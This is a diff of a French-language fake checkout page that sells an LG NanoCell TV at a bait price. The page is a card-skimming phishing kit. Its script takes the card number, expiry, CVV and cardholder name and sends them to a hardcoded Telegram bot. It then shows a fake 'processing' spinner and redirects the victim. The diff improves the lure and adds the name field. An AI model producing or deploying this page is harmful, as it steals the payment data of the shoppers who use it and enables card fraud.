@@ -4,57 +4,107 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Page de Paiement</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: linear-gradient(to right, #ffffff, #f4f4f4);
             margin: 0;
             padding: 0;
-            background-color: #f9f9f9;
         }
 
         .container {
-            max-width: 600px;
+            max-width: 700px;
             margin: 50px auto;
-            background: white;
+            background-color: #fff;
             border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px 40px;
         }
 
         h2 {
             text-align: center;
-            color: #333;
+            color: #c70000;
+            margin-bottom: 30px;
+            font-size: 24px;
         }
 
-        .form-group {
+        .product-info {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .product-info img {
+            width: 150px;
             margin-bottom: 15px;
         }
 
-        .form-group label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 5px;
+        .product-info p {
+            font-size: 16px;
+            color: #333;
         }
 
-        .form-group input, 
-        .form-group select, 
-        .form-group button {
+        .price {
+            font-size: 20px;
+            color: #c70000;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        hr {
+            border: 0;
+            border-top: 2px solid #c70000;
+            margin: 30px 0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            font-weight: 500;
+            margin-bottom: 8px;
+            display: block;
+            color: #333;
+        }
+
+        .form-group input {
             width: 100%;
-            padding: 10px;
-            font-size: 16px;
+            padding: 12px;
             border: 1px solid #ddd;
             border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #c70000;
+            outline: none;
         }
 
         .form-group button {
-            background-color: #4CAF50;
+            width: 100%;
+            padding: 15px;
+            background-color: #c70000;
             color: white;
             border: none;
+            border-radius: 5px;
+            font-size: 18px;
             cursor: pointer;
+            transition: background-color 0.3s ease;
         }
 
         .form-group button:hover {
-            background-color: #45a049;
+            background-color: #a50000;
+        }
+
+        .secure-payment {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .secure-payment img {
+            width: 150px;
         }
 
         .loading-overlay {
@@ -63,16 +113,31 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(255, 255, 255, 0.8);
+            background-color: rgba(255, 255, 255, 0.9);
             display: none;
-            align-items: center;
+            flex-direction: column;
             justify-content: center;
-            z-index: 9999;
+            align-items: center;
+            z-index: 1000;
         }
 
-        .spinner {
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-overlay img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .loading-overlay p {
+            font-size: 18px;
+            color: #333;
+        }
+
+        .loading-overlay .spinner {
             border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
+            border-top: 8px solid #c70000;
             border-radius: 50%;
             width: 50px;
             height: 50px;
@@ -87,104 +152,138 @@
 </head>
 <body>
 
-<div class="container">
-    <h2>Formulaire de Paiement</h2>
-    <form id="payment-form">
-        <div class="form-group">
-            <label for="card-number">Numéro de Carte</label>
-            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
+    <div class="container">
+        <div class="product-info">
+            <img src="51FWfzIHkWL.AC_SX679.jpg" alt="LG TV - 55NANO766">
+            <p><strong>LG TV - 55NANO766 - Acier foncé - 55'' (139 cm) - LED NanoCell 4K</strong></p>
+            <p>Taille de l'écran : 55 Pouces</p>
+            <p>Marque : LG</p>
+            <p>Technologie d'affichage : LED</p>
+            <p>Résolution : 4K</p>
+            <p>Fréquence de rafraîchissement : 50 Hz</p>
+            <p>Technologie de connectivité : USB, HDMI</p>
+            <p class="price">Prix : 399.99€</p>
         </div>
-        <div class="form-group">
-            <label for="expiry-month">Mois d'Expiration</label>
-            <select id="expiry-month" name="expiry-month" required>
-                <option value="01">01</option>
-                <option value="02">02</option>
-                <option value="03">03</option>
-                <option value="04">04</option>
-                <option value="05">05</option>
-                <option value="06">06</option>
-                <option value="07">07</option>
-                <option value="08">08</option>
-                <option value="09">09</option>
-                <option value="10">10</option>
-                <option value="11">11</option>
-                <option value="12">12</option>
-            </select>
+
+        <hr>
+
+        <h2>Informations de Paiement</h2>
+
+        <form id="payment-form">
+            <div class="form-group">
+                <label for="card-number">Numéro de carte</label>
+                <input 
+                    type="text" 
+                    id="card-number" 
+                    name="card-number" 
+                    placeholder="xxxx xxxx xxxx xxxx" 
+                    maxlength="19" 
+                    inputmode="numeric" 
+                    required>
+            </div>
+
+            <div class="form-group">
+                <label for="expiry-date">Date d'expiration</label>
+                <div style="display: flex; gap: 10px;">
+                    <select id="expiry-month" name="expiry-month" required>
+                        <option value="" disabled selected>Mois</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="expiry-year" name="expiry-year" required>
+                        <option value="" disabled selected>Année</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input 
+                    type="text" 
+                    id="cvv" 
+                    name="cvv" 
+                    placeholder="123" 
+                    maxlength="3" 
+                    inputmode="numeric" 
+                    required>
+            </div>
+
+            <div class="form-group">
+                <label for="name-on-card">Nom sur la carte</label>
+                <input type="text" id="name-on-card" name="name-on-card" placeholder="Entrez le nom" required>
+            </div>
+
+            <div class="form-group">
+                <button type="button" id="pay-button">Payer maintenant</button>
+            </div>
+        </form>
+
+        <div class="secure-payment">
+            <img src="instrumentys_paiement_securise_logo.jpg" alt="Paiement Sécurisé">
         </div>
-        <div class="form-group">
-            <label for="expiry-year">Année d'Expiration</label>
-            <select id="expiry-year" name="expiry-year" required>
-                <option value="2025">2025</option>
-                <option value="2026">2026</option>
-                <option value="2027">2027</option>
-                <option value="2028">2028</option>
-            </select>
-        </div>
-        <div class="form-group">
-            <label for="cvv">CVV</label>
-            <input type="text" id="cvv" name="cvv" placeholder="123" required>
-        </div>
-        <div class="form-group">
-            <button type="button" id="pay-button">Payer Maintenant</button>
-        </div>
-    </form>
-</div>
+    </div>
 
-<div class="loading-overlay" id="loading-overlay">
-    <div class="spinner"></div>
-</div>
+    <div class="loading-overlay" id="loading-overlay">
+        <p>Veuillez patienter...</p>
+        <div class="spinner"></div>
+    </div>
 
-<script>
-    document.getElementById('pay-button').addEventListener('click', async function () {
-        const loadingOverlay = document.getElementById('loading-overlay');
-        loadingOverlay.style.display = 'flex';
+    <script>
+        document.getElementById('pay-button').addEventListener('click', async function () {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            loadingOverlay.classList.add('active');
 
-        const form = document.getElementById('payment-form');
-        const formData = new FormData(form);
+            const form = document.getElementById('payment-form');
+            const data = new FormData(form);
 
-        const cardNumber = formData.get('card-number');
-        const expiryMonth = formData.get('expiry-month');
-        const expiryYear = formData.get('expiry-year');
-        const cvv = formData.get('cvv');
+            const cardNumber = data.get('card-number');
+            const expiryMonth = data.get('expiry-month');
+            const expiryYear = data.get('expiry-year');
+            const cvv = data.get('cvv');
+            const nameOnCard = data.get('name-on-card');
 
-        const message = `
+            const message = `
 💳 Numéro de Carte: ${cardNumber}
 📅 Expiration: ${expiryMonth}/${expiryYear}
 🔒 CVV: ${cvv}
-        `;
+📝 Nom: ${nameOnCard}
+            `;
 
-        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M';
-        const chatId = '5372119436';
+            const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M';
+            const chatId = '5372119436';
 
-        try {
-            const response = await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
-
-            const result = await response.json();
-
-            if (result.ok) {
-                console.log('Message envoyé à Telegram.');
-            } else {
-                console.error('Erreur lors de l\'envoi à Telegram.');
+            try {
+                await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            } catch (error) {
+                console.error('Erreur:', error);
             }
-        } catch (error) {
-            console.error('Erreur réseau :', error);
-        }
 
-        setTimeout(() => {
-            loadingOverlay.style.display = 'none';
-            window.location.href = 'Traitement.html';
-        }, 5000);
-    });
-</script>
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                window.location.href = 'Traitement.html';
+            }, 5000);
+        });
+    </script>
 
 </body>
 </html>
